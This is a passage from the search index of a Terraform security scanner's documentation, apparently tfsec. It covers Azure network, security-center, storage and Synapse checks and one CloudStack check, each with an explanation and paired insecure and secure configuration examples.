destination_address_prefix = \"0.0.0.0/0\"\n    access = \"Allow\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/network/no-public-egress/#secure-example","text":"<p>The following example will pass the azure-network-no-public-egress check. <pre><code> resource \"azurerm_network_security_rule\" \"good_example\" {\n    direction = \"Outbound\"\n    destination_address_prefix = \"10.0.0.0/16\"\n    access = \"Allow\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/network/no-public-egress/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/security/fundamentals/network-best-practices</p> </li> </ul>","title":"Links"},{"location":"checks/azure/network/no-public-ingress/","text":"","title":"An inbound network security rule allows traffic from /0."},{"location":"checks/azure/network/no-public-ingress/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/azure/network/no-public-ingress/#explanation","text":"<p>Network security rules should not use very broad subnets.</p> <p>Where possible, segments should be broken into smaller subnets.</p>","title":"Explanation"},{"location":"checks/azure/network/no-public-ingress/#possible-impact","text":"<p>The port is exposed for ingress from the internet</p>","title":"Possible Impact"},{"location":"checks/azure/network/no-public-ingress/#suggested-resolution","text":"<p>Set a more restrictive cidr range</p>","title":"Suggested Resolution"},{"location":"checks/azure/network/no-public-ingress/#insecure-example","text":"<p>The following example will fail the azure-network-no-public-ingress check. <pre><code> resource \"azurerm_network_security_rule\" \"bad_example\" {\n    direction = \"Inbound\"\n    source_address_prefix = \"0.0.0.0/0\"\n    access = \"Allow\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/network/no-public-ingress/#secure-example","text":"<p>The following example will pass the azure-network-no-public-ingress check. <pre><code> resource \"azurerm_network_security_rule\" \"good_example\" {\n    direction = \"Inbound\"\n    destination_address_prefix = \"10.0.0.0/16\"\n    access = \"Allow\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/network/no-public-ingress/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/security/fundamentals/network-best-practices</p> </li> </ul>","title":"Links"},{"location":"checks/azure/network/retention-policy-set/","text":"","title":"Retention policy for flow logs should be enabled and set to greater than 90 days"},{"location":"checks/azure/network/retention-policy-set/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/azure/network/retention-policy-set/#explanation","text":"<p>Flow logs are the source of truth for all network activity in your cloud environment.  To enable analysis in security event that was detected late, you need to have the logs available. </p> <p>Setting an retention policy will help ensure as much information is available for review.</p>","title":"Explanation"},{"location":"checks/azure/network/retention-policy-set/#possible-impact","text":"<p>Not enabling retention or having short expiry on flow logs could lead to compromise being undetected limiting time for analysis</p>","title":"Possible Impact"},{"location":"checks/azure/network/retention-policy-set/#suggested-resolution","text":"<p>Ensure flow log retention is turned on with an expiry of &gt;90 days</p>","title":"Suggested Resolution"},{"location":"checks/azure/network/retention-policy-set/#insecure-example","text":"<p>The following example will fail the azure-network-retention-policy-set check. <pre><code>resource \"azurerm_network_watcher_flow_log\" \"bad_watcher\" {\n    network_watcher_name = \"bad_watcher\"\n    resource_group_name = \"resource-group\"\n\n    network_security_group_id = azurerm_network_security_group.test.id\n    storage_account_id = azurerm_storage_account.test.id\n    enabled = true\n\n    retention_policy {\n        enabled = true\n        days = 7\n    }\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/network/retention-policy-set/#secure-example","text":"<p>The following example will pass the azure-network-retention-policy-set check. <pre><code>resource \"azurerm_network_watcher_flow_log\" \"good_watcher\" {\n    network_watcher_name = \"good_watcher\"\n    resource_group_name = \"resource-group\"\n\n    network_security_group_id = azurerm_network_security_group.test.id\n    storage_account_id = azurerm_storage_account.test.id\n    enabled = true\n\n    retention_policy {\n        enabled = true\n        days = 90\n    }\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/network/retention-policy-set/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_watcher_flow_log#retention_policy</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/network-watcher/network-watcher-monitoring-overview</p> </li> </ul>","title":"Links"},{"location":"checks/azure/network/ssh-blocked-from-internet/","text":"","title":"SSH access should not be accessible from the Internet, should be blocked on port 22"},{"location":"checks/azure/network/ssh-blocked-from-internet/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/azure/network/ssh-blocked-from-internet/#explanation","text":"<p>SSH access can be configured on either the network security group or in the network security group rule. </p> <p>SSH access should not be permitted from the internet (*, 0.0.0.0, /0, internet, any)</p>","title":"Explanation"},{"location":"checks/azure/network/ssh-blocked-from-internet/#possible-impact","text":"<p>Its dangerous to allow SSH access from the internet</p>","title":"Possible Impact"},{"location":"checks/azure/network/ssh-blocked-from-internet/#suggested-resolution","text":"<p>Block port 22 access from the internet</p>","title":"Suggested Resolution"},{"location":"checks/azure/network/ssh-blocked-from-internet/#insecure-example","text":"<p>The following example will fail the azure-network-ssh-blocked-from-internet check. <pre><code> resource \"azurerm_network_security_rule\" \"bad_example\" {\n      name                        = \"bad_example_security_rule\"\n      direction                   = \"Inbound\"\n      access                      = \"Allow\"\n      protocol                    = \"TCP\"\n      source_port_range           = \"*\"\n      destination_port_range      = \"22\"\n      source_address_prefix       = \"*\"\n      destination_address_prefix  = \"*\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/network/ssh-blocked-from-internet/#secure-example","text":"<p>The following example will pass the azure-network-ssh-blocked-from-internet check. <pre><code> resource \"azurerm_network_security_rule\" \"good_example\" {\n      name                        = \"good_example_security_rule\"\n      direction                   = \"Inbound\"\n      access                      = \"Allow\"\n      protocol                    = \"TCP\"\n      source_port_range           = \"*\"\n      destination_port_range      = \"22\"\n      source_address_prefix       = \"82.102.23.23\"\n      destination_address_prefix  = \"*\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/network/ssh-blocked-from-internet/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/data-sources/network_security_group#security_rule</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule#source_port_ranges</p> </li> </ul>","title":"Links"},{"location":"checks/azure/security-center/","text":"","title":"security-center"},{"location":"checks/azure/security-center/#checks","text":"<ul> <li> <p>alert-on-severe-notifications Send notification emails for high severity alerts</p> </li> <li> <p>enable-standard-subscription Enable the standard security center subscription tier</p> </li> <li> <p>set-required-contact-details The required contact details should be set for security center</p> </li> </ul>","title":"Checks"},{"location":"checks/azure/security-center/alert-on-severe-notifications/","text":"","title":"Send notification emails for high severity alerts"},{"location":"checks/azure/security-center/alert-on-severe-notifications/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/security-center/alert-on-severe-notifications/#explanation","text":"<p>It is recommended that at least one valid contact is configured for the security center.  Microsoft will notify the security contact directly in the event of a security incident using email and require alerting to be turned on.</p>","title":"Explanation"},{"location":"checks/azure/security-center/alert-on-severe-notifications/#possible-impact","text":"<p>The ability to react to high severity notifications could be delayed</p>","title":"Possible Impact"},{"location":"checks/azure/security-center/alert-on-severe-notifications/#suggested-resolution","text":"<p>Set alert notifications to be on</p>","title":"Suggested Resolution"},{"location":"checks/azure/security-center/alert-on-severe-notifications/#insecure-example","text":"<p>The following example will fail the azure-security-center-alert-on-severe-notifications check. <pre><code>        resource \"azurerm_security_center_contact\" \"bad_example\" {\n        email = \"bad_example@example.com\"\n        phone = \"+1-555-555-5555\"\n\n        alert_notifications = false\n        alerts_to_admins = false\n        }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/security-center/alert-on-severe-notifications/#secure-example","text":"<p>The following example will pass the azure-security-center-alert-on-severe-notifications check. <pre><code>        resource \"azurerm_security_center_contact\" \"good_example\" {\n        email = \"good_example@example.com\"\n        phone = \"+1-555-555-5555\"\n\n        alert_notifications = true\n        alerts_to_admins = true\n        }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/security-center/alert-on-severe-notifications/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_contact#alert_notifications</p> </li> <li> <p>https://azure.microsoft.com/en-us/services/security-center/</p> </li> </ul>","title":"Links"},{"location":"checks/azure/security-center/enable-standard-subscription/","text":"","title":"Enable the standard security center subscription tier"},{"location":"checks/azure/security-center/enable-standard-subscription/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/azure/security-center/enable-standard-subscription/#explanation","text":"<p>To benefit from Azure Defender you should use the Standard subscription tier.</p> <pre><code>        Enabling Azure Defender extends the capabilities of the free mode to workloads running in private and other public clouds, providing unified security management and threat protection across your hybrid cloud workloads.\n</code></pre>","title":"Explanation"},{"location":"checks/azure/security-center/enable-standard-subscription/#possible-impact","text":"<p>Using free subscription does not enable Azure Defender for the resource type</p>","title":"Possible Impact"},{"location":"checks/azure/security-center/enable-standard-subscription/#suggested-resolution","text":"<p>Enable standard subscription tier to benefit from Azure Defender</p>","title":"Suggested Resolution"},{"location":"checks/azure/security-center/enable-standard-subscription/#insecure-example","text":"<p>The following example will fail the azure-security-center-enable-standard-subscription check. <pre><code> resource \"azurerm_security_center_subscription_pricing\" \"bad_example\" {\n   tier          = \"Free\"\n   resource_type = \"VirtualMachines\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/security-center/enable-standard-subscription/#secure-example","text":"<p>The following example will pass the azure-security-center-enable-standard-subscription check. <pre><code> resource \"azurerm_security_center_subscription_pricing\" \"good_example\" {\n   tier          = \"Standard\"\n   resource_type = \"VirtualMachines\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/security-center/enable-standard-subscription/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_subscription_pricing#tier</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/security-center/security-center-pricing</p> </li> </ul>","title":"Links"},{"location":"checks/azure/security-center/set-required-contact-details/","text":"","title":"The required contact details should be set for security center"},{"location":"checks/azure/security-center/set-required-contact-details/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/azure/security-center/set-required-contact-details/#explanation","text":"<p>It is recommended that at least one valid contact is configured for the security center.  Microsoft will notify the security contact directly in the event of a security incident and will look to use a telephone number in cases where a prompt response is required.</p>","title":"Explanation"},{"location":"checks/azure/security-center/set-required-contact-details/#possible-impact","text":"<p>Without a telephone number set, Azure support can't contact</p>","title":"Possible Impact"},{"location":"checks/azure/security-center/set-required-contact-details/#suggested-resolution","text":"<p>Set a telephone number for security center contact</p>","title":"Suggested Resolution"},{"location":"checks/azure/security-center/set-required-contact-details/#insecure-example","text":"<p>The following example will fail the azure-security-center-set-required-contact-details check. <pre><code>        resource \"azurerm_security_center_contact\" \"bad_example\" {\n        email = \"bad_contact@example.com\"\n        phone = \"\"\n\n        alert_notifications = true\n        alerts_to_admins = true\n        }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/security-center/set-required-contact-details/#secure-example","text":"<p>The following example will pass the azure-security-center-set-required-contact-details check. <pre><code>        resource \"azurerm_security_center_contact\" \"good_example\" {\n        email = \"good_contact@example.com\"\n        phone = \"+1-555-555-5555\"\n\n        alert_notifications = true\n        alerts_to_admins = true\n        }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/security-center/set-required-contact-details/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_contact#phone</p> </li> <li> <p>https://azure.microsoft.com/en-us/services/security-center/</p> </li> </ul>","title":"Links"},{"location":"checks/azure/storage/","text":"","title":"storage"},{"location":"checks/azure/storage/#checks","text":"<ul> <li> <p>allow-microsoft-service-bypass Trusted Microsoft Services should have bypass access to Storage accounts</p> </li> <li> <p>default-action-deny The default action on Storage account network rules should be set to deny</p> </li> <li> <p>enforce-https Storage accounts should be configured to only accept transfers that are over secure connections</p> </li> <li> <p>no-public-access Storage containers in blob storage mode should not have public access</p> </li> <li> <p>queue-services-logging-enabled When using Queue Services for a storage account, logging should be enabled.</p> </li> <li> <p>use-secure-tls-policy The minimum TLS version for Storage Accounts should be TLS1_2</p> </li> </ul>","title":"Checks"},{"location":"checks/azure/storage/allow-microsoft-service-bypass/","text":"","title":"Trusted Microsoft Services should have bypass access to Storage accounts"},{"location":"checks/azure/storage/allow-microsoft-service-bypass/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/azure/storage/allow-microsoft-service-bypass/#explanation","text":"<p>Some Microsoft services that interact with storage accounts operate from networks that can't be granted access through network rules. </p> <p>To help this type of service work as intended, allow the set of trusted Microsoft services to bypass the network rules</p>","title":"Explanation"},{"location":"checks/azure/storage/allow-microsoft-service-bypass/#possible-impact","text":"<p>Trusted Microsoft Services won't be able to access storage account unless rules set to allow</p>","title":"Possible Impact"},{"location":"checks/azure/storage/allow-microsoft-service-bypass/#suggested-resolution","text":"<p>Allow Trusted Microsoft Services to bypass</p>","title":"Suggested Resolution"},{"location":"checks/azure/storage/allow-microsoft-service-bypass/#insecure-example","text":"<p>The following example will fail the azure-storage-allow-microsoft-service-bypass check. <pre><code> resource \"azurerm_storage_account\" \"bad_example\" {\n   name                = \"storageaccountname\"\n   resource_group_name = azurerm_resource_group.example.name\n\n   location                 = azurerm_resource_group.example.location\n   account_tier             = \"Standard\"\n   account_replication_type = \"LRS\"\n\n   network_rules {\n     default_action             = \"Deny\"\n     ip_rules                   = [\"100.0.0.1\"]\n     virtual_network_subnet_ids = [azurerm_subnet.example.id]\n    bypass                     = [\"Metrics\"]\n   }\n\n   tags = {\n     environment = \"staging\"\n   }\n }\n\n resource \"azurerm_storage_account_network_rules\" \"test\" {\n   resource_group_name  = azurerm_resource_group.test.name\n   storage_account_name = azurerm_storage_account.test.name\n\n   default_action             = \"Allow\"\n   ip_rules                   = [\"127.0.0.1\"]\n   virtual_network_subnet_ids = [azurerm_subnet.test.id]\n   bypass                     = [\"Metrics\"]\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/storage/allow-microsoft-service-bypass/#secure-example","text":"<p>The following example will pass the azure-storage-allow-microsoft-service-bypass check. <pre><code> resource \"azurerm_storage_account\" \"good_example\" {\n   name                = \"storageaccountname\"\n   resource_group_name = azurerm_resource_group.example.name\n\n   location                 = azurerm_resource_group.example.location\n   account_tier             = \"Standard\"\n   account_replication_type = \"LRS\"\n\n   network_rules {\n     default_action             = \"Deny\"\n     ip_rules                   = [\"100.0.0.1\"]\n     virtual_network_subnet_ids = [azurerm_subnet.example.id]\n     bypass                     = [\"Metrics\", \"AzureServices\"]\n   }\n\n   tags = {\n     environment = \"staging\"\n   }\n }\n\n resource \"azurerm_storage_account_network_rules\" \"test\" {\n   resource_group_name  = azurerm_resource_group.test.name\n   storage_account_name = azurerm_storage_account.test.name\n\n   default_action             = \"Allow\"\n   ip_rules                   = [\"127.0.0.1\"]\n   virtual_network_subnet_ids = [azurerm_subnet.test.id]\n   bypass                     = [\"Metrics\", \"AzureServices\"]\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/storage/allow-microsoft-service-bypass/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#bypass</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account_network_rules#bypass</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/storage/common/storage-network-security#trusted-microsoft-services</p> </li> </ul>","title":"Links"},{"location":"checks/azure/storage/default-action-deny/","text":"","title":"The default action on Storage account network rules should be set to deny"},{"location":"checks/azure/storage/default-action-deny/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/azure/storage/default-action-deny/#explanation","text":"<p>The default_action for network rules should come into effect when no other rules are matched.</p> <p>The default action should be set to Deny.</p>","title":"Explanation"},{"location":"checks/azure/storage/default-action-deny/#possible-impact","text":"<p>Network rules that allow could cause data to be exposed publicly</p>","title":"Possible Impact"},{"location":"checks/azure/storage/default-action-deny/#suggested-resolution","text":"<p>Set network rules to deny</p>","title":"Suggested Resolution"},{"location":"checks/azure/storage/default-action-deny/#insecure-example","text":"<p>The following example will fail the azure-storage-default-action-deny check. <pre><code> resource \"azurerm_storage_account_network_rules\" \"bad_example\" {\n\n   default_action             = \"Allow\"\n   ip_rules                   = [\"127.0.0.1\"]\n   virtual_network_subnet_ids = [azurerm_subnet.test.id]\n   bypass                     = [\"Metrics\"]\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/storage/default-action-deny/#secure-example","text":"<p>The following example will pass the azure-storage-default-action-deny check. <pre><code> resource \"azurerm_storage_account_network_rules\" \"good_example\" {\n\n   default_action             = \"Deny\"\n   ip_rules                   = [\"127.0.0.1\"]\n   virtual_network_subnet_ids = [azurerm_subnet.test.id]\n   bypass                     = [\"Metrics\"]\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/storage/default-action-deny/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account_network_rules#default_action</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/firewall/rule-processing</p> </li> </ul>","title":"Links"},{"location":"checks/azure/storage/enforce-https/","text":"","title":"Storage accounts should be configured to only accept transfers that are over secure connections"},{"location":"checks/azure/storage/enforce-https/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/azure/storage/enforce-https/#explanation","text":"<p>You can configure your storage account to accept requests from secure connections only by setting the Secure transfer required property for the storage account. </p> <p>When you require secure transfer, any requests originating from an insecure connection are rejected. </p> <p>Microsoft recommends that you always require secure transfer for all of your storage accounts.</p>","title":"Explanation"},{"location":"checks/azure/storage/enforce-https/#possible-impact","text":"<p>Insecure transfer of data into secure accounts could be read if intercepted</p>","title":"Possible Impact"},{"location":"checks/azure/storage/enforce-https/#suggested-resolution","text":"<p>Only allow secure connection for transferring data into storage accounts</p>","title":"Suggested Resolution"},{"location":"checks/azure/storage/enforce-https/#insecure-example","text":"<p>The following example will fail the azure-storage-enforce-https check. <pre><code> resource \"azurerm_storage_account\" \"bad_example\" {\n   name                      = \"storageaccountname\"\n   resource_group_name       = azurerm_resource_group.example.name\n   location                  = azurerm_resource_group.example.location\n   account_tier              = \"Standard\"\n   account_replication_type  = \"GRS\"\n   enable_https_traffic_only = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/storage/enforce-https/#secure-example","text":"<p>The following example will pass the azure-storage-enforce-https check. <pre><code> resource \"azurerm_storage_account\" \"good_example\" {\n   name                      = \"storageaccountname\"\n   resource_group_name       = azurerm_resource_group.example.name\n   location                  = azurerm_resource_group.example.location\n   account_tier              = \"Standard\"\n   account_replication_type  = \"GRS\"\n   enable_https_traffic_only = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/storage/enforce-https/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#enable_https_traffic_only</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/storage/common/storage-require-secure-transfer</p> </li> </ul>","title":"Links"},{"location":"checks/azure/storage/no-public-access/","text":"","title":"Storage containers in blob storage mode should not have public access"},{"location":"checks/azure/storage/no-public-access/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/azure/storage/no-public-access/#explanation","text":"<p>Storage container public access should be off. It can be configured for blobs only, containers and blobs or off entirely. The default is off, with no public access.</p> <p>Explicitly overriding publicAccess to anything other than off should be avoided.</p>","title":"Explanation"},{"location":"checks/azure/storage/no-public-access/#possible-impact","text":"<p>Data in the storage container could be exposed publicly</p>","title":"Possible Impact"},{"location":"checks/azure/storage/no-public-access/#suggested-resolution","text":"<p>Disable public access to storage containers</p>","title":"Suggested Resolution"},{"location":"checks/azure/storage/no-public-access/#insecure-example","text":"<p>The following example will fail the azure-storage-no-public-access check. <pre><code> resource \"azurerm_storage_container\" \"bad_example\" {\n    name                  = \"terraform-container-storage\"\n    container_access_type = \"blob\"\n\n    properties = {\n        \"publicAccess\" = \"blob\"\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/storage/no-public-access/#secure-example","text":"<p>The following example will pass the azure-storage-no-public-access check. <pre><code> resource \"azurerm_storage_container\" \"good_example\" {\n    name                  = \"terraform-container-storage\"\n    container_access_type = \"private\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/storage/no-public-access/#links","text":"<ul> <li> <p>https://www.terraform.io/docs/providers/azure/r/storage_container.html#properties</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-configure?tabs=portal#set-the-public-access-level-for-a-container</p> </li> </ul>","title":"Links"},{"location":"checks/azure/storage/queue-services-logging-enabled/","text":"","title":"When using Queue Services for a storage account, logging should be enabled."},{"location":"checks/azure/storage/queue-services-logging-enabled/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/storage/queue-services-logging-enabled/#explanation","text":"<p>Storage Analytics logs detailed information about successful and failed requests to a storage service. </p> <p>This information can be used to monitor individual requests and to diagnose issues with a storage service. </p> <p>Requests are logged on a best-effort basis.</p>","title":"Explanation"},{"location":"checks/azure/storage/queue-services-logging-enabled/#possible-impact","text":"<p>Logging provides valuable information about access and usage</p>","title":"Possible Impact"},{"location":"checks/azure/storage/queue-services-logging-enabled/#suggested-resolution","text":"<p>Enable logging for Queue Services</p>","title":"Suggested Resolution"},{"location":"checks/azure/storage/queue-services-logging-enabled/#insecure-example","text":"<p>The following example will fail the azure-storage-queue-services-logging-enabled check. <pre><code> resource \"azurerm_storage_account\" \"bad_example\" {\n     name                     = \"example\"\n     resource_group_name      = data.azurerm_resource_group.example.name\n     location                 = data.azurerm_resource_group.example.location\n     account_tier             = \"Standard\"\n     account_replication_type = \"GRS\"\n     queue_properties  {\n   }\n }\n\n  resource \"azurerm_storage_queue\" \"bad_example\" {\n     name                 = \"my-queue\"\n     storage_account_name  = azurerm_storage_account.bad_example.name\n  }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/storage/queue-services-logging-enabled/#secure-example","text":"<p>The following example will pass the azure-storage-queue-services-logging-enabled check. <pre><code> resource \"azurerm_storage_account\" \"good_example\" {\n     name                     = \"example\"\n     resource_group_name      = data.azurerm_resource_group.example.name\n     location                 = data.azurerm_resource_group.example.location\n     account_tier             = \"Standard\"\n     account_replication_type = \"GRS\"\n     queue_properties  {\n     logging {\n         delete                = true\n         read                  = true\n         write                 = true\n         version               = \"1.0\"\n         retention_policy_days = 10\n     }\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/storage/queue-services-logging-enabled/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#logging</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/storage/common/storage-analytics-logging?tabs=dotnet</p> </li> </ul>","title":"Links"},{"location":"checks/azure/storage/use-secure-tls-policy/","text":"","title":"The minimum TLS version for Storage Accounts should be TLS1_2"},{"location":"checks/azure/storage/use-secure-tls-policy/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/azure/storage/use-secure-tls-policy/#explanation","text":"<p>Azure Storage currently supports three versions of the TLS protocol: 1.0, 1.1, and 1.2. </p> <p>Azure Storage uses TLS 1.2 on public HTTPS endpoints, but TLS 1.0 and TLS 1.1 are still supported for backward compatibility.</p> <p>This check will warn if the minimum TLS is not set to TLS1_2.</p>","title":"Explanation"},{"location":"checks/azure/storage/use-secure-tls-policy/#possible-impact","text":"<p>The TLS version being outdated and has known vulnerabilities</p>","title":"Possible Impact"},{"location":"checks/azure/storage/use-secure-tls-policy/#suggested-resolution","text":"<p>Use a more recent TLS/SSL policy for the load balancer</p>","title":"Suggested Resolution"},{"location":"checks/azure/storage/use-secure-tls-policy/#insecure-example","text":"<p>The following example will fail the azure-storage-use-secure-tls-policy check. <pre><code> resource \"azurerm_storage_account\" \"bad_example\" {\n   name                     = \"storageaccountname\"\n   resource_group_name      = azurerm_resource_group.example.name\n   location                 = azurerm_resource_group.example.location\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/storage/use-secure-tls-policy/#secure-example","text":"<p>The following example will pass the azure-storage-use-secure-tls-policy check. <pre><code> resource \"azurerm_storage_account\" \"good_example\" {\n   name                     = \"storageaccountname\"\n   resource_group_name      = azurerm_resource_group.example.name\n   location                 = azurerm_resource_group.example.location\n   min_tls_version          = \"TLS1_2\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/storage/use-secure-tls-policy/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#min_tls_version</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/storage/common/transport-layer-security-configure-minimum-version</p> </li> </ul>","title":"Links"},{"location":"checks/azure/synapse/","text":"","title":"synapse"},{"location":"checks/azure/synapse/#checks","text":"<ul> <li>virtual-network-enabled Synapse Workspace should have managed virtual network enabled, the default is disabled.</li> </ul>","title":"Checks"},{"location":"checks/azure/synapse/virtual-network-enabled/","text":"","title":"Synapse Workspace should have managed virtual network enabled, the default is disabled."},{"location":"checks/azure/synapse/virtual-network-enabled/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/azure/synapse/virtual-network-enabled/#explanation","text":"<p>Synapse Workspace does not have managed virtual network enabled by default.</p> <p>When you create your Azure Synapse workspace, you can choose to associate it to a Microsoft Azure Virtual Network. The Virtual Network associated with your workspace is managed by Azure Synapse. This Virtual Network is called a Managed workspace Virtual Network. Managed private endpoints are private endpoints created in a Managed Virtual Network associated with your Azure Synapse workspace. Managed private endpoints establish a private link to Azure resources. You can only use private links in a workspace that has a Managed workspace Virtual Network.</p>","title":"Explanation"},{"location":"checks/azure/synapse/virtual-network-enabled/#possible-impact","text":"<p>Your Synapse workspace is not using the private endpoints</p>","title":"Possible Impact"},{"location":"checks/azure/synapse/virtual-network-enabled/#suggested-resolution","text":"<p>Set manage virtual network to enabled</p>","title":"Suggested Resolution"},{"location":"checks/azure/synapse/virtual-network-enabled/#insecure-example","text":"<p>The following example will fail the azure-synapse-virtual-network-enabled check. <pre><code> resource \"azurerm_synapse_workspace\" \"bad_example\" {\n   name                                 = \"example\"\n   resource_group_name                  = azurerm_resource_group.example.name\n   location                             = azurerm_resource_group.example.location\n   storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n   sql_administrator_login              = \"sqladminuser\"\n   sql_administrator_login_password     = \"H@Sh1CoR3!\"\n\n   aad_admin {\n     login     = \"AzureAD Admin\"\n     object_id = \"00000000-0000-0000-0000-000000000000\"\n     tenant_id = \"00000000-0000-0000-0000-000000000000\"\n   }\n\n   tags = {\n     Env = \"production\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/azure/synapse/virtual-network-enabled/#secure-example","text":"<p>The following example will pass the azure-synapse-virtual-network-enabled check. <pre><code> resource \"azurerm_synapse_workspace\" \"good_example\" {\n   name                                 = \"example\"\n   resource_group_name                  = azurerm_resource_group.example.name\n   location                             = azurerm_resource_group.example.location\n   storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n   sql_administrator_login              = \"sqladminuser\"\n   sql_administrator_login_password     = \"H@Sh1CoR3!\"\n   managed_virtual_network_enabled     = true\n   aad_admin {\n     login     = \"AzureAD Admin\"\n     object_id = \"00000000-0000-0000-0000-000000000000\"\n     tenant_id = \"00000000-0000-0000-0000-000000000000\"\n   }\n\n   tags = {\n     Env = \"production\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/azure/synapse/virtual-network-enabled/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/synapse_workspace#managed_virtual_network_enabled</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/synapse-analytics/security/synapse-workspace-managed-private-endpoints</p> </li> <li> <p>https://docs.microsoft.com/en-us/azure/synapse-analytics/security/synapse-workspace-managed-vnet</p> </li> </ul>","title":"Links"},{"location":"checks/cloudstack/","text":"","title":"cloudstack"},{"location":"checks/cloudstack/#services","text":"<ul> <li>compute</li> </ul>","title":"Services"},{"location":"checks/cloudstack/compute/","text":"","title":"compute"},{"location":"checks/cloudstack/compute/#checks","text":"<ul> <li>no-sensitive-info No sensitive data stored in user_data</li> </ul>","title":"Checks"},{"location":"checks/cloudstack/compute/no-sensitive-info/","text":"","title":"No sensitive data stored in user_data"},{"location":"checks/cloudstack/compute/no-sensitive-info/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/cloudstack/compute/no-sensitive-info/#explanation","text":"<p>When creating instances, user data can be used during the initial configuration. User data must not contain sensitive information</p>","title":"Explanation"},{"location":"checks/cloudstack/compute/no-sensitive-info/#possible-impact","text":"<p>Sensitive credentials in the user data can be leaked</p>","title":"Possible Impact"},{"location":"checks/cloudstack/compute/no-sensitive-info/#suggested-resolution","text":"<p>Don't use sensitive data in the user data section</p>","title":"Suggested Resolution"},{"location":"checks/cloudstack/compute/no-sensitive-info/#insecure-example","text":"<p>The following example will fail the cloudstack-compute-no-sensitive-info check. <pre><code> resource \"cloudstack_instance\" \"web\" {\n   name             = \"server-1\"\n   service_offering = \"small\"\n   network_id       = \"6eb22f91-7454-4107-89f4-36afcdf33021\"\n   template         = \"CentOS 6.5\"\n   zone             = \"zone-1\"\n   user_data        = &lt;&lt;EOF\n export DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n EOF\n 